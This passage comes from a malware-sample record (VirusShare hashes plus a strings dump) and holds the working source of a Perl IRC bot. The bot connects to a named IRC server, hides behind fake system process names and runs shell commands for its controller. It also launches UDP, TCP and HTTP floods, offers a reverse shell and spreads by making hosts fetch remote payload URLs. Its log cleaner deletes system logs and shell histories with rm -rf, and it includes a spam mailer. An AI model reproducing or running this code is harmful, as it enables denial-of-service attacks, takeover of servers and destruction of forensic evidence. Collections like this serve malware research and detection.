5);\ndeop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n}\n\nif ($case =~ /^msg\\s+(\\S+) (.*)/) {\nmsg(\"$1\", \"$2\");\n}\n\nif ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {\nfor (my $cf = 1; $cf <= $1; $cf++) {\nmsg(\"$2\", \"$3\");\n}\n}\n\nif ($case =~ /^ctcp\\s+(\\S+) (.*)/) {\nctcp(\"$1\", \"$2\");\n}\n\nif ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {\nfor (my $cf = 1; $cf <= $1; $cf++) {\nctcp(\"$2\", \"$3\");\n}\n}\n\nif ($case =~ /^nick (.*)/) {\nnick(\"$1\");\n}\n\nif ($case =~ /^connect\\s+(\\S+)\\s+(\\S+)/) {\nconectar(\"$2\", \"$1\", 6667);\n}\n\nif ($case =~ /^raw (.*)/) {\nsendraw(\"$1\");\n}\n\nif ($case =~ /^eval (.*)/) {\neval \"$1\";\n}\n}\n\nsub shell {\nmy $printl=$_[0];\nmy $comando=$_[1];\nif ($comando =~ /cd (.*)/) {\nchdir(\"$1\") || msg(\"$printl\", \"No such file or directory\");\nreturn;\n}\n\nelsif ($pid = fork) {\nwaitpid($pid, 0);\n}\nelse {\nif (fork) {\nexit;\n\n} else {\nmy @resp=`$comando 2>&1 3>&1`;\nmy $c=0;\nforeach my $linha (@resp) {\n  $c++;\n  chop $linha;\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");\n  if ($c == \"$linas_max\") {\n    $c=0;\n    sleep $sleep;\n  }\n}\nexit;\n}\n}\n}\n\nsub tcpflooder {\nmy $itime = time;\nmy ($cur_time);\nmy ($ia,$pa,$proto,$j,$l,$t);\n$ia=inet_aton($_[0]);\n$pa=sockaddr_in($_[1],$ia);\n$ftime=$_[2];\n$proto=getprotobyname('tcp');\n$j=0;$l=0;\n$cur_time = time - $itime;\nwhile ($l<1000){\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\n$t=\"SOCK$l\";\nsocket($t,PF_INET,SOCK_STREAM,$proto);\nconnect($t,$pa)||$j--;\n$j++;$l++;\n}\n$l=0;\nwhile ($l<1000){\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\n$t=\"SOCK$l\";\nshutdown($t,2);\n$l++;\n}\n}\n\nsub udpflooder {\nmy $iaddr = inet_aton($_[0]);\nmy $msg = 'A' x $_[1];\nmy $ftime = $_[2];\nmy $cp = 0;\nmy (%pacotes);\n$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;\nsocket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;\nsocket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;\nsocket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;\nsocket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;\nreturn(undef) if $cp == 4;\nmy $itime = time;\nmy ($cur_time);\nwhile ( 1 ) {\nfor (my $porta = 1;\n$porta <= 65000; $porta++) {\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\nsend(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;\nsend(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;\nsend(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;\nsend(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;\n\n\nfor (my $pc = 3;\n$pc <= 255;$pc++) {\nnext if $pc == 6;\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\nsocket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;\nsend(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;\n}\n}\nlast if $cur_time >= $ftime;\n}\nreturn($cur_time, %pacotes);\n}\n\nsub ctcp {\nreturn unless $#_ == 1;\nsendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");\n}\n\nsub msg {\nreturn unless $#_ == 1;\nsendraw(\"PRIVMSG $_[0] :$_[1]\");\n}\n\nsub notice {\nreturn unless $#_ == 1;\nsendraw(\"NOTICE $_[0] :$_[1]\");\n}\n\nsub op {\nreturn unless $#_ == 1;\nsendraw(\"MODE $_[0] +o $_[1]\");\n}\n\nsub deop {\nreturn unless $#_ == 1;\nsendraw(\"MODE $_[0] -o $_[1]\");\n}\n\nsub j {\n&join(@_);\n}\n\nsub join {\nreturn unless $#_ == 0;\nsendraw(\"JOIN $_[0]\");\n\n}\nsub p { part(@_);\n}\n\nsub part {\nsendraw(\"PART $_[0]\");\n}\n\nsub nick {\nreturn unless $#_ == 0;\nsendraw(\"NICK $_[0]\");\n}\n\nsub quit {\nsendraw(\"QUIT $_[0]\");\n}\n\n}\n\n"
    },
    "filename": "VirusShare_30077d6812699ce256d019a7dda7da17",
    "filesize": 24699,
    "filetype": "data",
    "hashes": {
        "md5": "30077d6812699ce256d019a7dda7da17",
        "sha1": "018a03dfe537a1e811abebe7b913da70ab232cf7",
        "sha256": "9875d7f7aa60fc898bbdb5a919d30018c0dedf34f05a1c9e5e14c96100bcee50"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "use IO::Socket::INET;",
            "use HTTP::Request;",
            "use LWP::UserAgent;",
            "my @ps = (\"/usr/sbin/httpd\",\"/usr/local/apache/bin/httpd -DSSL\",\"/sbin/syslogd\",\"[Deco]\",\"/sbin/klogd -c 1 -x -x\",\"/usr/sbin/acpid\",\"/usr/sbin/cron\",\"[httpds]\",\"/usr/sbin/httpd\",\"[bash]\"); ",
            "$processo = $ps[rand scalar @ps]; ",
            "my $linas_max='10';",
            "my $sleep='3';",
            "my @adms=(\"Prince\");",
            "my @canais=\"#prince\";",
            "my @nickname = (\"ali\",\"veli\",\"hamza\",\"KacakMabaK\",\"GEnc-Fenerrr\",\"ALin-IverSon\",\"Genc-Fener-Asabi\",\"Buyenimi\",\"AdisYonS\",\"Diana-DeaR\",\"AbreGKim\",\"NurullahHim\",\"Onderim\",\"Ercanim\",\"Onurum\",",
            "\"bomiyiSeviyorum\",\"KabacKim\",\"SohbetciVarmi\",\"TitizMan\",\"SohbeTedeK\",\"ArtiverindeKonusaK\",\"ArtivermeyinSakin\",\"EdaMmm\",\"CAnimSikiLdi\",\"GinaGeLdi\",\"Daster1\",\"Genc-FeNErbahceLiLE\",\"FenerbahceLiWeLEdLer_\",\"kerem\",\"MoonpeCt\",\"Debusyy\",\"BayXxXx\",\"manjedanss\",\"manyaqqq\",\"GusetCik\",\"Kayahaan\",\"Klavyeci\",\"KIopatrra\",\"KnightdeviL\",",
            "\"Kalamata\",\"Kuyumcu18m\",\"Kagan07\",\"Kartegena\",\"Genc-FenerLiLer\",\"Kirsehirli_Dogukan\",\"Kime^^nedeme\",\"MynameisTerry-TerryMore\",\"OldumYaw\",\"alalAlalala\",\"ONEyAW\",\"cETyAPAK\",",
            "\"HAdiGideKYaW\",\"LaaaYnnn\",\"SeytanSeytanmi\",\"MeLekiLeSeytan\",\"aLemciii\",\"Lectomenon\",\"alark0\",\"teamforss\",\"omanLid\",\"Komando1\",\"Diyarlar\",\"kaanistanbul\",\"stanisTt\",\"Seviyoruum\",",
            "\"AsikOLdum\",\"OnuSeviyorumm\",\"EsenCAn_\",\"Elifff\",\"TersLicem\",\"Amandaaman\",\"Ciclkteam\",\"antiqteam\",\"sexibayan\",\"__unforgiven__\",\"_TeaMa_\",\"_GlasForTen_\",\"___GhosT___\",\"K-0-r-u-m-a\",\"EsRaaaaa\",\"SocinGfon\",\"Kizilderililer\",\"sovalyeee\",\"_hotbender\",\"Whisiped\",\"Kayip-GenC\",\"XTanbuL\",\"OnuryoK\",\"FLiippeer\",\"MerALaR\",\"yeniperten\",\"adanaahmet24\",",
            "\"mehmetcandemir\",\"GazeteCiii\",\"HaKan\",\"GurKhaan\",\"ChatLaqBoY\",\"GameovrS\",\"TitaniCc\",\"__OfffBea\",\"SaatKaC\",\"SakaTcocuk\",\"KafadanSakaT\",\"KayraN\",\"Kilisenin--iMami\",",
            "\"Kalbinin-SeSi\",\"King_ejderha\",\"NapoLiten\",\"NaNiSs\",\"NaNikNaNiK\",\"neksussix\",\"XsuziKaa\",\"XXManXX\",\"PoLis333\",\"Ne0iLi\",\"Nesi-be\",\"NaimiiSiLence\",\"Bellive\",\"keMaL\",",
            "\"Haydar\",\"X_police\",\"bLacK_M\",\"RainbowLord\",\"ZeBuB\",\"BeLLZeBuB\",\"FreaKK\",\"Anti_siLence\",\"CerattiVe\",\"DarKCode\",\"blue_and_black\",\"Bad_mad\",\"Dark_factor\",\"DarK_Sector\",",
            "\"StinG\",\"Whiskey\",\"Zin_xN\",\"negative\",\"SuckSs\",\"MatriX___\",\"Ayhan\",\"okan23m\",\"purgatory\",\"melike\",\"CerNoBiL\",\"PE-CIH\",\"SipastiK\",\"Zuper_DoG\",\"Last_Man\",\"XCalibre\",",
            "\"mIRC31\",\"Fak_yu\",\"Cerative\",\"Sucks_man\",\"Dark_Native\",\"Native\",\"MaNiAc_\",\"AntiManiaC\",\"m-a-f\",\"LoNeLy_DoG\",\"White_WolF\",\"Zello\",\"MAKINACI\",\"OXyGen___\",\"No_Light\",",
            "\"DaRKSuN_\",\"istisna\",\"YanDaS\",\"JOMBO\",\"Sprite\",\"KiLLeRs\",\"MEMCim\",\"aaron\",\"aarti\",\"abdenace\",\"abdol\",\"abdul\",\"abdulkaf\",\"abdullah\",\"abdur\",\"abhijit\",\"abhiram\",\"abraham\",",
            "\"Mr_Spam\",\"DARKNeSs\",\"AntiSilence\",\"SiLeNCeR\",\"eMPeRoR\",\"suna\",\"asude\",\"leyla\",\"hakan___\",\"CeSi\",\"No_Blue\",\"SiyanuR\",\"Duran\",\"Sen|ton\",\"John37\",\"Se|v|er\",\"Amtiedor\",",
            "\"Bees\",\"FLunL\",\"|S|clor|\",\"_MagiC_\",\"Miranda17\",\"Em|neM_\",\"SixxoR\",\"Flex_Jax\",\"FlipPo\",\"Temnao\",\"DuYoe\",\"GreeZa[away]\",\"Gis\",\"[Gis]\",\"Rem][dy\",\"KMA-One\",\"AsAfEr\",\"GoLLiaH\",",
            "\"Steal[187]\",\"[death]bot\",\"Stephan_\",\"Dre-\",\"GiZmoZo\",\"KillerBee\",\"MeNtos\",\"EstiCa\",\"Flipp|p\",\"Red][Fire\",\"WaterBoY\",\"Lover-17f\",\"PeaceMan\",\"Melissa14\",\"Assimi\",\"Herman\",",
            "\"Jolanda\",\"Jolien\",\"XzibiT\",\"SnoopDOGG\",\"REALEST[1]\",\"[x]speed\",\"Eter17\",\"Jackson5\",\"SiX\",\"RUFF_RYDER\",\"Sean\",\"Puffy\",\"Nine19\",\"Filanda[aq]\",\"NeleZ\",\"Nsdore\",\"Dante[\",\"Expert18\",",
            "\"Ekzpert18\",\"True_LorD\",\"miranja28\",\"melena_16\",\"JarigJan\",\"]GatoR[\",\"Spinner\",\"Stuff-R\",\"Sfen\",\"Negil\",\"Frag[z]\",\"Away-Me\",\"Melanic\",\"Jack_Ass\",\"Melanie17\",\"Verdana\",",
            "\"Ariul\",\"Aphex-Twin\",\"Sexy_Lady21\",\"KoMMaR\",\"Xz|biT\",\"RAPID\",\"FunkyFlex\",\"Georgie\",\"Gedale\",\"Dexstar\",\"Forbitter\",\"Gerrit\",\"PitBull_fighter\",\"[Gis]a\",\"MissNath\",\"BoyLove\",);",
            "my @rname = (Prince);",
            "my $nick = $nickname[rand scalar @nickname];",
            "my $ircname = $nickname[rand scalar @nickname];",
            "my $realname = $nickname[rand scalar @nickname];",
            "$servidor='irc.mildnet.name' unless $servidor;",
            "my $porta='6667';",
            "$SIG{'INT'} = 'IGNORE';",
            "$SIG{'HUP'} = 'IGNORE';",
            "$SIG{'TERM'} = 'IGNORE';",
            "$SIG{'CHLD'} = 'IGNORE';",
            "$SIG{'PS'} = 'IGNORE';",
            "use IO::Socket;",
            "use Socket;",
            "use IO::Select;",
            "chdir(\"/\");",
            "###########",
            "# Connect #",
            "###########",
            "$servidor=\"$ARGV[0]\" if $ARGV[0];",
            "$0=\"$processo\".\"\\0\"x16;;",
            "my $pid=fork;",
            "exit if $pid;",
            "die \"Fork Problems: $!\" unless defined($pid);",
            "our %irc_servers;",
            "our %DCC;",
            "my $dcc_sel = new IO::Select->new();",
            "$sel_cliente = IO::Select->new();",
            "sub sendraw {",
            "  if ($#_ == '1') {",
            "    my $socket = $_[0];",
            "    print $socket \"$_[1]\\n\";",
            "    } else {",
            "    print $IRC_cur_socket \"$_[0]\\n\";",
            "sub conectar {",
            "  my $meunick = $_[0];",
            "  my $servidor_con = $_[1];",
            "  my $porta_con = $_[2];",
            "  my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\",",
            "  PeerPort=>$porta_con) or return(1);",
            "  if (defined($IRC_socket)) {",
            "    $IRC_cur_socket = $IRC_socket;",
            "    $IRC_socket->autoflush(1);",
            "    $sel_cliente->add($IRC_socket);",
            "    $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";",
            "    $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";",
            "    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;",
            "    nick(\"$meunick\");",
            "    sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");",
            "    sleep 1;",
            "my $line_temp;",
            "while( 1 ) {",
            "  while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }",
            "  delete($irc_servers{''}) if (defined($irc_servers{''}));",
            "  my @ready = $sel_cliente->can_read(0);",
            "  next unless(@ready);",
            "  foreach $fh (@ready) {",
            "    $IRC_cur_socket = $fh;",
            "    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};",
            "    $nread = sysread($fh, $msg, 4096);",
            "    if ($nread == 0) {",
            "      $sel_cliente->remove($fh);",
            "      $fh->close;",
            "      delete($irc_servers{$fh});",
            "    }",
            "    @lines = split (/\\n/, $msg);",
            "    for(my $c=0; $c<= $#lines; $c++) {",
            "      $line = $lines[$c];",
            "      $line=$line_temp.$line if ($line_temp);",
            "      $line_temp='';",
            "      $line =~ s/\\r$//;",
            "      unless ($c == $#lines) {",
            "        parse(\"$line\");",
            "        } else {",
            "        if ($#lines == 0) {",
            "          parse(\"$line\");",
            "          } elsif ($lines[$c] =~ /\\r$/) {",
            "          parse(\"$line\");",
            "          } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {",
            "          parse(\"$line\"); ",
            "          \t   } else {",
            "          \t               $line_temp = $line;",
            "        }",
            "      }",
            "    }",
            "sub parse {",
            "  my $servarg = shift;",
            "  if ($servarg =~ /^PING \\:(.*)/) {",
            "    sendraw(\"PONG :$1\");",
            "    } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {",
            "    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;",
            "    if ($args =~ /^\\001VERSION\\001$/) {",
            "      \t notice(\"$pn\", \"\\001VERSION mIRC v6.17 Mic22\\001\");",
            "    }",
            "    if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms ) {",
            "    if ($onde eq \"$meunick\"){",
            "    shell(\"$pn\", \"$args\");",
            "##################",
            "# End of Connect #",
            "##################",
            "######################",
            "#      PREFIX        #",
            "######################",
            "  if ($args =~ /^(\\Q$meunick\\E|\\!so)\\s+(.*)/ ) {",
            "    my $natrix = $1;",
            "    my $arg = $2;",
            "    if ($arg =~ /^\\!(.*)/) {",
            "      ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!so\" and $arg =~ /^\\!nick/);",
            "      } elsif ($arg =~ /^\\@(.*)/) {",
            "      $ondep = $onde;",
            "      $ondep = $pn if $onde eq $meunick;",
            "      bfunc(\"$ondep\",\"$1\");",
            "      } else {",
            "      shell(\"$onde\", \"$arg\");",
            "    }",
            "######################",
            "#   End of PREFIX    #",
            "######################",
            "elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {",
            "if (lc($1) eq lc($meunick)) {",
            "  $meunick=$4;",
            "  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "} elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {",
            "nick(\"$meunick\".int rand(99));",
            "} elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {",
            "$meunick = $2;",
            "$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "$irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";",
            "foreach my $canal (@canais) {",
            "  sendraw(\"JOIN $canal ddosit\");",
            "sub bfunc {",
            "my $printl = $_[0];",
            "my $funcarg = $_[1];",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "  exit;",
            "} else {",
            "######################",
            "#       Help         # ",
            "######################",
            "if ($funcarg =~ /^help/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " Lets Go!, Nih depe command :\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "ddos\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "backconnect\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "shell\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " Untuk command lain, ketik:\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "commands\");",
            "if ($funcarg =~ /^ddos/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " Ada tiga command DDOS\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " UDPFlood, HTTPFlood and TCPFlood\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "udpflood <ip> <packet size> <time>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "tcpflood <ip> <port> <packet size> <time>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "httpflood <site> <time>\");",
            "if ($funcarg =~ /^backconnect/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " Gunakan command ini untuk reverse shell :\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "back <ip><port>\");",
            "if ($funcarg =~ /^shell/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " Command integrasi bot shell\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " Bisa digunakan untuk privat maupun public channel\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " Untuk public chan gunakan : ",
            "12!so cd tmp",
            "12 (contoh)\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " Untuk command linux ketik :",
            "!so ",
            "linuxhelp\");",
            "if ($funcarg =~ /^commands/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4.:!:.",
            "Help",
            "4.:!:.",
            " Ini commandnya :\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "back <ip><port>\");\t",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "cd tmp ",
            "4 untuk contoh\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "udpflood <ip> <packet size> <time>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "tcpflood <ip> <port> <packet size> <time>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "httpflood <site> <time>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "linuxhelp\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "spread <scan>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "system\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "logcleaner\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "sendmail <subject> <sender> <recipient> <message>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "join #channel\");\t",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Help",
            "12.:!:.",
            " !so ",
            "part #channel\");",
            "if ($funcarg =~ /^linuxhelp/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "LinuxHelp",
            "12.:!:.",
            " - Dir where you are : pwd\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "LinuxHelp",
            "12.:!:.",
            " - Start a Perl file : perl file.pl\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "LinuxHelp",
            "12.:!:.",
            " - Go back from dir : cd ..\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "LinuxHelp",
            "12.:!:.",
            " - Force to Remove a file/dir : rm -rf file/dir;ls -la\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "LinuxHelp",
            "12.:!:.",
            " - Show all files/dir with permissions : ls -lia\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "LinuxHelp",
            "12.:!:.",
            " - Find config.inc.php files : find / -type f -name config.inc.php\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "LinuxHelp",
            "12.:!:.",
            " - Find all writable folders and files : find / -perm -2 -ls\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "LinuxHelp",
            "12.:!:.",
            " - Find all .htpasswd files : find / -type f -name .htpasswd\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "LinuxHelp",
            "12.:!:.",
            " - Find all service.pwd files : find / -type f -name service.pwd\");",
            "######################",
            "#   End of  Help     # ",
            "######################",
            "if ($funcarg =~ /^spread\\s+(.*)/) {",
            "my $sbj = \"http://munbaekcho.es.kr/gallery/data/log/logger.txt?\";",
            "$vuln = $1;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Spread Mode",
            "12.:!:.",
            " Spreading bot on :",
            "14 $vuln\");",
            "my $shellurl=\"http://\".$vuln.$sbj.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$shellurl);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Spread Mode",
            "12.:!:.",
            " Bot is Spreaded on :",
            "14 $vuln\"); ",
            "if ($funcarg =~ /^spreads\\s+(.*)/) {",
            "my $soh = \"http://www.traviswolff.com/gspreadz.txt?\";",
            "$vuln = $1;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Spread Mode",
            "12.:!:.",
            " Spreading bot on :",
            "14 $vuln\");",
            "my $shellurl=\"http://\".$vuln.$soh.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$shellurl);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Spread Mode",
            "12.:!:.",
            " Conficker Bot is Spreaded on :",
            "14 $vuln\"); ",
            "######################",
            "#     Commands       # ",
            "######################",
            "if ($funcarg =~ /^system/) {",
            "$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "System Info",
            "12.:!:.",
            " Info BOT : Server : ",
            "14Cannot View",
            "14 1337\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "System Info",
            "12.:!:.",
            " Uname -a     : ",
            "7 $uname\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "System Info",
            "12.:!:.",
            " Uptime       : ",
            "7 $uptime\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "System Info",
            "12.:!:.",
            " Own Prosses  : ",
            "7 $processo\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "System Info",
            "12.:!:.",
            " ID           : ",
            "7 $id\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "System Info",
            "12.:!:.",
            " Own Dir      : ",
            "7 $ownd\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "System Info",
            "12.:!:.",
            " OS           : ",
            "7 $distro\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "System Info",
            "12.:!:.",
            " Owner        : ",
            "7 aputo\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "System Info",
            "12.:!:.",
            " Channel      : ",
            "7 ssab\");",
            "######################",
            "#    Log Cleaner     #  ",
            "######################",
            "if ($funcarg =~ /^logcleaner/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Log Cleaner!!!",
            "12.:!:.",
            " it takes a couple of minutes...\"); ",
            "    system 'rm -rf /var/log/lastlog';",
            "    system 'rm -rf /var/log/wtmp';",
            "\tsystem 'rm -rf /etc/wtmp';",
            "\tsystem 'rm -rf /var/run/utmp';",
            "\tsystem 'rm -rf /etc/utmp';",
            "\tsystem 'rm -rf /var/log';",
            "\tsystem 'rm -rf /var/logs';",
            "\tsystem 'rm -rf /var/adm';",
            "\tsystem 'rm -rf /var/apache/log';",
            "\tsystem 'rm -rf /var/apache/logs';",
            "\tsystem 'rm -rf /usr/local/apache/log'; ",
            "\tsystem 'rm -rf /usr/local/apache/logs';",
            "\tsystem 'rm -rf /root/.bash_history';",
            "\tsystem 'rm -rf /root/.ksh_history';",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Log Cleaner",
            "12.:!:.",
            "4log files have been cleaned\"); ",
            "\t\tsleep 1;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Log Cleaner",
            "12.:!:.",
            "4system log cleaner\");",
            "\tsystem 'find / -name *.bash_history -exec rm -rf {} \\;';",
            "\tsystem 'find / -name *.bash_logout -exec rm -rf {} \\;';",
            "\tsystem 'find / -name \"log*\" -exec rm -rf {} \\;';",
            "\tsystem 'find / -name *.log -exec rm -rf {} \\;';",
            "\t\tsleep 1;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Log Cleaner",
            "12.:!:.",
            "4done! all log files have been cleaned\"); ",
            "      }",
            "######################",
            "# End of Log Cleaner #  ",
            "######################",
            "###########################################################",
            "#       MAILER                                            #",
            "# For mailing use :                                       #",
            "# !lol @sendmail <subject> <sender> <recipient> <message> #",
            "###########################################################",
            "if ($funcarg =~ /^sendmail\\s+(.*)\\s+(.*)\\s+(.*)\\s+(.*)/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Mailer",
            "12.:!:.",
            " Try Sending Mail to :",
            "10 $3\");",
            "$subject = $1;",
            "$sender = $2;",
            "$recipient = $3; ",
            "@corpo = $4;",
            "$mailtype = \"content-type: text/html\";",
            "$sendmail = '/usr/sbin/sendmail';",
            "open (SENDMAIL, \"| $sendmail -t\");",
            "print SENDMAIL \"$mailtype\\n\";",
